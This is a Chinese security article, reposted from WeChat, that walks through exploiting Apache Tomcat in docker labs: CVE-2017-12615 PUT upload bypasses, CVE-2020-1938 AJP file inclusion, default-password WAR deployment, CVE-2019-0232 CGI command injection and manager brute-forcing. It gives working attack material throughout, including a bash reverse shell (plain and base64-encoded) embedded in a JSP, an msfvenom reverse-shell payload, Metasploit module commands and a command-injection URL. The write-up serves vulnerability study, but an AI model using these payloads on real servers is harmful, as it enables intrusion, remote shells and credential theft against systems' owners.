<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rqnk7OOkHbub5zeuFFmJ3g)

简介
==

Tomcat 是 Apache 软件基金会（Apache Software Foundation）的 Jakarta 项目中的一个核心项目，由 Apache、Sun 和其他一些公司及个人共同开发而成。由于有了 Sun 的参与和支持，最新的 Servlet 和 JSP 规范总是能在 Tomcat 中得到体现，Tomcat 5 支持最新的 Servlet 2.4 和 JSP 2.0 规范。因为 Tomcat 技术先进、性能稳定，而且免费，因而深受 Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的 Web 应用服务器。

Tomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试 JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好 Apache 服务器，可利用它响应 HTML（标准通用标记语言下的一个应用）页面的访问请求。实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行 tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的。

诀窍是，当配置正确时，Apache 为 HTML 页面服务，而 Tomcat 实际上运行 JSP 页面和 Servlet。另外，Tomcat 和 IIS 等 Web 服务器一样，具有处理 HTML 页面的功能，另外它还是一个 Servlet 和 JSP 容器，独立的 Servlet 容器是 Tomcat 的默认模式。不过，Tomcat 处理静态 HTML 的能力不如 Apache 服务器。目前 Tomcat 最新版本为 10.0.5。

CVE-2017-12615
==============

CVE-2017-12615 对应的漏洞为任意文件写入，主要影响的是 Tomcat 的 7.0.0-7.0.81 这几个版本

漏洞原理
----

由于配置不当（非默认配置），将配置文件`conf/web.xml`中的`readonly`设置为了 false，导致可以使用 PUT 方法上传任意文件，但限制了 jsp 后缀的上传

根据描述，在 Windows 服务器下，将 readonly 参数设置为 false 时，即可通过 PUT 方式创建一个 JSP 文件，并可以执行任意代码

通过阅读 conf/web.xml 文件，可以发现，默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控

漏洞复现
----

这里使用 vuluhub 的 docker 进行漏洞复现，这里就不详细介绍环境搭建了

首先进入 CVE-2017-12615 的 docker 环境

```
sudo docker-compose up -ddocker ps    //查看docker环境是否启动成功
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw1aIUrUicCrCXZRCuWZNQObMUsyCLwV0wYQYkqicfgvJwwgSxvuHtibVPQ/640?wx_fmt=png)

这里首先进入 docker 里查看一下`web.xml`的代码，可以看到这里`readonly`设置为`false`，所以存在漏洞

```
sudo docker exec -ti ec bash    //进入docker容器cat conf/web.xml | grep readonly
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwxDG7fx4ZM2LZkvwDMUShuUJsO6L7AaTSzj9yCYiakOsUOLoN1PiaT4IQ/640?wx_fmt=png)

访问下 8080 端口，对应的是`Tomcat 8.5.19`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwbP2VLn2z8Jx6MbROH7sPeO7erTbJP2LwmVjGKotDXC9ia2D4QC1icfmQ/640?wx_fmt=png)

在 8080 端口进行抓包，这里发现是一个`GET`方法

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwqj6wXptBPFmhGqGEplTZPsibicu5Yx90gmKh5PTbGkf3ZdiaByTrofsfw/640?wx_fmt=png)

这里首先测试一下，改为`PUT`方法写入一个`test.txt`，这里看到返回 201，应该已经上传成功了

```
PUT /test.txt HTTP/1.1testpoc
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwNm12UsVhJFmTIbvSr1DWVlA6mgN2Y7Vib66M65tJ262ONAv9wY1RpPg/640?wx_fmt=png)

这里进入 docker 查看一下已经写入成功了

```
cd /usr/local/tomcat/webapps/ROOTls
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwFJ84N3Svdt3iaSnONPZTSfyGM49XmNoYfibic92rd3NUyBRUPKZ29hphQ/640?wx_fmt=png)

之前说过，使用 PUT 方法上传任意文件，但限制了 jsp 后缀的上传，这里首先使用 PUT 方法直接上传一个冰蝎的 jsp 上去，发现返回的是 404，应该是被拦截了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw37o4nP5976iaH9jgQXIpNl4CXWQzOuuIzqFlULVsOIeTSdVibJ6pVhaw/640?wx_fmt=png)

这里就需要进行绕过，这里绕过有三种方法

```
1.Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格2.Windows NTFS流Put/a001.jsp::$DATA HTTP/1.13. /在文件名中是非法的，也会被去除（Linux/Windows）Put/a001.jsp/http:/1.1
```

首先使用`%20`绕过。我们知道`%20`对应的是空格，在 windows 中若文件这里在 jsp 后面添加`%20`即可达到自动抹去空格的效果。这里看到返回 201 已经上传成功了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwqfTxPFUnRPel9yG4ObINVb0TEpMvS0s1LIOhvk7yX9DQMjhMPMA4Pw/640?wx_fmt=png)

进入 docker 查看一下，确认是上传上去了

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwOib3ocod1QIRrTpp9ORibBuVgVj6sQUs0t9PtBc356bOSz3k5GmQ5QOg/640?wx_fmt=png)

第二种方法为在 jsp 后缀后面使用`/`，因为`/`在文件名中是非法的，在 windows 和 linux 中都会自动去除。根据这个特性，上传`/ice1.jsp/`，看到返回 201

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwtkqkbW5PNEOfnccFb3YcDfuF5QoaWNXhllNsicZHRFKOxS4H1gRicjCg/640?wx_fmt=png)

进入 docker 查看发现已经上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwAXPDkuY1DH1x6bH5zhibZK7vSXVfv8GBiajK5S7GzkZO1HqqcQ4H0qwA/640?wx_fmt=png)

第三种方法就是使用 Windows NTFS 流，在 jsp 后面添加`::$DATA`，看到返回 201，上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwwPlVlKpr8Rcbzd0qIibXHBcGmZ6Djia0Viaz42zoumNodyLsFlzwm7wtQ/640?wx_fmt=png)

进入 docker 验证一下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwR93rqHiaemF6Qez8oyfqibzHiavicC7WvOh6VCCvO9rviaV0gdR0QXIMZWA/640?wx_fmt=png)

这里随便连接一个 jsp 即可拿到 webshell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwqVdGQS9ibLnseZrQLVlICfLWGJAkvc4MlVUIpg00ea36R7oGeGFX44g/640?wx_fmt=png)

CVE-2020-1938
=============

CVE-2020-1938 为 Tomcat AJP 文件包含漏洞。由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源码。

此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

漏洞原理
----

Tomcat 配置了两个 Connecto，它们分别是 HTTP 和 AJP ：HTTP 默认端口为 8080，处理 http 请求，而 AJP 默认端口 8009，用于处理 AJP 协议的请求，而 AJP 比 http 更加优化，多用于反向、集群等，漏洞由于 Tomcat AJP 协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器 webapp 下的任意文件以及可以包含任意文件，如果有某上传点，上传图片马等等，即可以获取 shell

tomcat 默认的 conf/server.xml 中配置了 2 个 Connector，一个为 8080 的对外提供的 HTTP 协议端口，另外一个就是默认的 8009 AJP 协议端口，两个端口默认均监听在外网 ip。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwTI94NkuqjgCY95pCZVYuHaJBibWLXz9QBURA9j9bXZWicswHDWPoCjrg/640?wx_fmt=png)

tomcat 在接收 ajp 请求的时候调用 org.apache.coyote.ajp.AjpProcessor 来处理 ajp 消息，prepareRequest 将 ajp 里面的内容取出来设置成 request 对象的 Attribute 属性

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwmBtpTibccZaPbVQic7MBnbVr0tDspEwtt1funicCe0vmtfyDFKVyd0Jug/640?wx_fmt=png)

因此可以通过此种特性从而可以控制 request 对象的下面三个 Attribute 属性

```
javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path
```

然后封装成对应的 request 之后, 继续走 servlet 的映射流程如下

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw50dLCeMeEQQiasbiaBXPfoicYFZLgEWQPIVoPrBVWCMSUIFrgBglBxM9w/640?wx_fmt=png)

漏洞复现
----

启动 CVE-2020-1938 的 docker 环境

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwWq7KtMvtAjgaYyldl6vDnaibcY7hzd4cdSVLueGpfjp8OXEVPibS9ErA/640?wx_fmt=png)

首先使用 poc 进行漏洞检测，若存在漏洞则可以查看 webapps 目录下的所有文件

```
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lficd CNVD-2020-10487-Tomcat-Ajp-lfipython CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwYWEkPAjwEiaZ0czrx47GtbsLJkzbYgEvl2zxLSAo8M0XZNOdP6zRBLg/640?wx_fmt=png)

这里查看 8009 端口下的`web.xml`文件

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwLMHZmN8U3lia8EsBtSEibpKXykgElQzPMeJaGR5CJUyzicDQao6crmUpQ/640?wx_fmt=png)

使用 bash 反弹 shell

```
bash -i >& /dev/tcp/192.168.1.8/8888 0>&1
```

因为是 java 的原因所以需要转换一下，使用 http://www.jackson-t.ca/runtime-exec-payloads.html，转换结果如下

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}
```

生成一个`test.txt`，这里只需要换 payload 就可以

```
<%    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}").getInputStream();    int a = -1;    byte[] b = new byte[2048];    out.print("<pre>");    while((a=in.read(b))!=-1){        out.println(new String(b));    }    out.print("</pre>");%>
```

bp 抓包把`test.txt`上传到 docker 容器

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw86Yag81McWI5iasjocRj8tFqq7mrTR6v7L7iabj8LKnrb9LNKEeLs6ibQ/640?wx_fmt=png)

nc 开启端口监听

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwlMdwnM2TeWxBjZNbExnuFEjG8XRiaXDFFYjuc3TOpyJuQn54Qbh1PkA/640?wx_fmt=png)

即可获得一个交互型 shell

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f test.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwZDXyeyZ20HibbkMzdC08cwPbicPLYicJP1M3iaPoeibZY0z1rcQfRicT0j6Q/640?wx_fmt=png)

这里为了方便，上线到 msf 上进行操作，首先生成一个`shell.txt`

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > shell.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwDE4o1Y4ZpSl6Qm8EvKonDbjWBkBHiafspicZowoH39movsRGFNK9UjTA/640?wx_fmt=png)

抓包将`shell.txt`上传到 docker

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwlkdLibTyiaCyF8vtqGoUHMlz7hlxMSh7PYfM6o5Tl8CDm6CYWoYWBRLg/640?wx_fmt=png)

msf 开启监听，注意 payload 使用`java/jsp_shell_reverse_tcp`

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwcIzs6U0QJjf2tibUPekGGXic3bMVgQYtMWPaCgCkzbhtSrTfsibjquvNQ/640?wx_fmt=png)

再使用 poc 反弹即可上线

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f shell.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwSWphHmJnN7zQYKyfNsibTuSibbr1HTTJV3YIIKZdVH4dvwHocybcHYtw/640?wx_fmt=png)

弱口令 & war 远程部署
==============

漏洞原理
----

在 tomcat8 环境下默认进入后台的密码为 tomcat/tomcat，未修改造成未授权即可进入后台

漏洞复现
----

进入`tomcat8`的 docker 环境

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwXy0Bs7ATPhzMLg8nu8qTYkAa8MibKhBYrOVYJP8MjpulUEuCPxJ6oaw/640?wx_fmt=png)

访问后台管理地址，使用 tomcat/tomcat 进入后台

```
http://192.168.1.8:8080//manager/html
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwxx6SicTkovVAYz2QdxicYVPgSiagkfGrjQUZMXGXia0vAGoym1AAnvibaiag/640?wx_fmt=png)

进入到了后台的页面

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNws7HAUWZ6fWuzicBpQE5VoPrTYFtYygbiag0vgaHTQaw83jnJ9FTibkW4Q/640?wx_fmt=png)

看到这里有一个上传 war 包的地方，这里很多 java 的中间件都可以用 war 远程部署来拿 shell，tomcat 也不例外

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwFdibdPdFEXTpRYFicgGiaevB6qIcnNvnRy1QLiaiaKUbumJdylJP6oJMdMg/640?wx_fmt=png)

首先将 ice.jsp 打包成 test.war

```
jar -cvf test.war .
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwickzzVLKhlIRVWuESTz5g1siafOlkcQSOSazia5Uibf5UezwZibmeArJywA/640?wx_fmt=png)

点击上传即可看到上传的 test.war 已经部署成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw9bQyG8kGpvWmROZeUwlSpM8cfjszLT2wyUTZ9lNdQRGECkNBSsvWyQ/640?wx_fmt=png)

访问一下没有报错 404 那么应该已经上传成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwS7JNNezsibLvs1DLR3L5YW7nvzjibRu9a8oIVcy5gg4oYVJ9GHAqMFPg/640?wx_fmt=png)

使用冰蝎连接即可得到 shell

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwf6H8XW9kqgQ1Yw01jhtwOdLtxicId6E7o9nMx858DUk6mP6s3LY1OWQ/640?wx_fmt=png)

这里也可以用 msf 里面的`exploit/multi/http/tomcat_mgr_upload` 模块

```
use exploit/multi/http/tomcat_mgr_uploadset HttpPassword tomcatset HttpUsername tomcatset rhost 192.168.1.8set rport 8080run
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwRJic8hqW2lrmjtqRKH7jQLtRhapCzZTicve52hwRS2B4TsXNpVhAiczDQ/640?wx_fmt=png)

运行即可得到一个 meterpreter

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwC26Uc9ghkNO3JvRTTGZ11RW35Y7a4IClAgOiaPYWGI1TBnySILrncYg/640?wx_fmt=png)

CVE-2019-0232
=============

CVE-2019-0232 为 Apache Tomcat RCE

漏洞原理
----

漏洞相关的代码在 tomcat\java\org\apache\catalina\servlets\CGIServlet.java 中，CGIServlet 提供了一个 cgi 的调用接口，在启用 enableCmdLineArguments 参数时，会根据 RFC 3875 来从 Url 参数中生成命令行参数，并把参数传递至 Java 的 Runtime 执行。这个漏洞是因为 Runtime.getRuntime().exec 在 Windows 中和 Linux 中底层实现不同导致的

Java 的 `Runtime.getRuntime().exec` 在 CGI 调用这种情况下很难有命令注入。而 Windows 中创建进程使用的是 `CreateProcess` ，会将参数合并成字符串，作为 `lpComandLine` 传入 `CreateProcess` 。程序启动后调用 `GetCommandLine` 获取参数，并调用 `CommandLineToArgvW` 传至 argv。在 Windows 中，当 `CreateProcess` 中的参数为 bat 文件或是 cmd 文件时，会调用 `cmd.exe` , 故最后会变成 `cmd.exe /c "arg.bat & dir"`，而 Java 的调用过程并没有做任何的转义，所以在 Windows 下会存在漏洞

漏洞复现
----

启动 tomcat

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNww8BC5UpJSHwyiaib7tsibn8PZmez7njgqZhQboH9ElaHmDmrIwChpggBA/640?wx_fmt=png)

访问一下已经启动成功

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwHdBOSrKQX0qJUibAU20IGqLZs4RxYJEByCKYjvqWoe7BiaX4wVeurFjQ/640?wx_fmt=png)

Tomcat 的 CGI_Servlet 组件默认是关闭的，在`conf/web.xml`中找到注释的 CGIServlet 部分，去掉注释，并配置 enableCmdLineArguments 和 executable

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw02JqwgvUicb0Z91USKfCHlaKG91icFF3QqNibWc0vsmECVgvcc4Y1jflg/640?wx_fmt=png)

这里注意一下，去掉注释并添加以下代码

```
enableCmdLineArguments启用后才会将Url中的参数传递到命令行executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。
```

```
<init-param>        <param-name>enableCmdLineArguments</param-name>        <param-value>true</param-value>    </init-param>    <init-param>        <param-name>executable</param-name>        <param-value></param-value>    </init-param>
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwMUHKroEz574ImLTWWCykMepF8YaLoQzwFAqFQvz4Sbc5Gbo3hicf4sQ/640?wx_fmt=png)

然后在 conf/web.xml 中启用 cgi 的 servlet-mapping

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwFuVtlVy92CcpVAzudO6icgY1dLPEOLqNoDJKo14cAt96Bd7I4y9CjyQ/640?wx_fmt=png)

修改 conf/context.xml 的添加 privileged="true" 属性，否则会没有权限

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwT8wMcLibOp3g3Lo2VDNpOsBx90hXUlov5Qeg8EzosWqYaH9TCBbFiayg/640?wx_fmt=png)

添加 true

```
<Context privileged="true">
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwz7CUFyvDD3KbmWpbR1icVEF2WpEUpxz1WVpyMugIyjia1bZ6jKibx9bIA/640?wx_fmt=png)

在`C:\Tomcat\webapps\ROOT\WEB-INF`下创建`cgi-bin`目录

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwG9r3Klc1t7E6QRkSVk6Eo9XATuVUEeiaUY0cXqEzn6EpJPKLUcxO8Hg/640?wx_fmt=png)

在该目录下创建一个 hello.bat

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwAzW4KwFPOyia1UwC2kdl3PiaS3BrB3ydm9vg3nYl4crvmhHwYZJPYddw/640?wx_fmt=png)

然后重启 tomcat 环境

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwQQACB8KufO4kYiaUkfQAPK0M9NZHfewFAAKJU8iaoyEb2aSDiaBCXj9Qw/640?wx_fmt=png)

访问`http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe`即可弹出计算器，这里构造系统命令即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwWxibaJzBtYHQuPXJx68lv2thFqCmxc9ibrD58vTVWQMfyh4dQyZJXnIw/640?wx_fmt=png)

manager App 暴力破解
================

漏洞原理
----

后台密码用 base64 编码传输，抓包解密即可得到后台密码，也可以进行爆破

漏洞复现
----

这里访问`http://192.168.1.8:8000/manager/html`进行抓包，在没有输入帐号密码的时候是没有什么数据的

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwavxfztcLrdx5xJde3rQ6IFick5tvKBDkjnC4RHeJicicTgKeEtOo5ia2kA/640?wx_fmt=png)

把这个包放过去，会请求输入用户名和密码，再进行抓包

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNw2ao8h0J6LgUHibcicq5eicqGK2FFxFJkQH4E1Mjpg548h9serjibDZJf4A/640?wx_fmt=png)

就可以得到`Authorization`这个字段，这个字段有一个`Basic`，就是 base64 加密的意思

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwFSWX3RUia7rzeUHIWuFlIKEkuYYwRibl7gGlMozcfltm3ow4z8f50x5A/640?wx_fmt=png)

这里直接放到 base64 解密得到`tomcat:tomcat`的密码

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwGHuicgiacGZbycc2STDLD4y47fBK9T4EYPs3kR7089TmLqpluRNx4OBg/640?wx_fmt=png)

进入后台之后再次抓包可以看到有一个 cookie，但是没有了`Authorization`这个字段

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwVF6uibFM3XtKGc5mDq2wGKXTBhzqTTmLK2VXxWmxZ7eanibwXibmQibp6g/640?wx_fmt=png)

我们可以对字段进行爆破，加上`Authorization`即可

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwJzRVoVyR98jg6ntJ79RBpVUbXUsdwh990uWNJakHjPACWCjRNtHXrQ/640?wx_fmt=png)

去掉自带的编码

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwcXpcHPt8aqia7eicOOxmqYDmbfib4dwZXLLubaodv58IelCSZrnNpqicicQ/640?wx_fmt=png)

攻击即可拿到账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibkfD8Rk9Sviar3cMaK7QWNwDfJ55POtD254ic58ia5Jnv8x5BiciaFkqVjKJcic3m5ZU4TAYPxjBFPwA1g/640?wx_fmt=png)

**![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)**

**推荐阅读：**

**[干货 | Spring 系列 CVE 以及 POC 编写](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498027&idx=1&sn=6800b032fb7d44edf98b8a95187a3d73&chksm=ec1cac14db6b25022aecbca4b54b9e76f8c5de9a448d0fcc4f36b7ef45daaa25b32829c24b6b&scene=21#wechat_redirect)  
**

**[干货｜Java Spring 安全学习笔记](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247499429&idx=1&sn=a96a0e81109294703d6a5192fce7ca2a&chksm=ec1cab9adb6b228cac06a76d3db1928b1bde0b4338065c5e9d62f3dded94cc54a4f04cf123d2&scene=21#wechat_redirect)**  

[**干货 | 最全的 Weblogic 漏洞复现**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247498979&idx=1&sn=254f5fd3cde4cf3a4bcdcce58c1029f1&chksm=ec1ca9dcdb6b20ca20ea2838ddaf3ba17fdf239fb057db49ac866bf4d94f70518915801fcc6d&scene=21#wechat_redirect)  

**点赞，转发，在看**

原创投稿作者：mathwizard

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)